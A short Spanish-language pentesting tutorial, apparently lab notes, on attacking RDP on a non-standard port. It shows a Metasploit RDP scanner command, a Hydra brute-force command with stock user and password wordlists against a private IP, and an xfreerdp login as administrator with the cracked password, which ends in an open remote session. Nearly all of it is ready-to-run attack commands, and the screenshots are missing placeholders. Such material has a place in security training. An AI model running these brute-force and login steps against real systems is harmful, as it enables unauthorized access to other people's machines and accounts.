# Hacking al Protocolo RDP  Puerto 3389

Por lo general RDP corre sobre el puerto 3389, pero si corre en otro puerto podemos confirmarlo y atacarlo con Metasploit y Hydra. Pasos:

{% stepper %}
{% step %}
### 1) Detectar si un puerto es RDP con Metasploit

Usamos el módulo de scanner RDP de Metasploit:

```bash
use auxiliary/scanner/rdp/rdp_scanner
```

!\[\[Pasted image 20230730164711.png]]
{% endstep %}

{% step %}
### 2) Fuerza bruta con Hydra

Una vez identificado el puerto RDP, atacamos con Hydra (ejemplo usando listas de usuarios y contraseñas comunes):

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.28.92 -s 3333
```

Resultado (usuarios encontrados):

!\[\[Pasted image 20230730165016.png]]
{% endstep %}

{% step %}
### 3) Conexión remota con xfreerdp

Con las credenciales obtenidas nos conectamos usando xfreerdp indicando usuario, contraseña y host:puerto:

```bash
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.28.92:3333
```

!\[\[Pasted image 20230730165316.png]]
{% endstep %}

{% step %}
### 4) Sesión abierta

Una vez autenticados, ya tendremos acceso remoto:

!\[\[Pasted image 20230730165226.png]]
{% endstep %}
{% endstepper %}
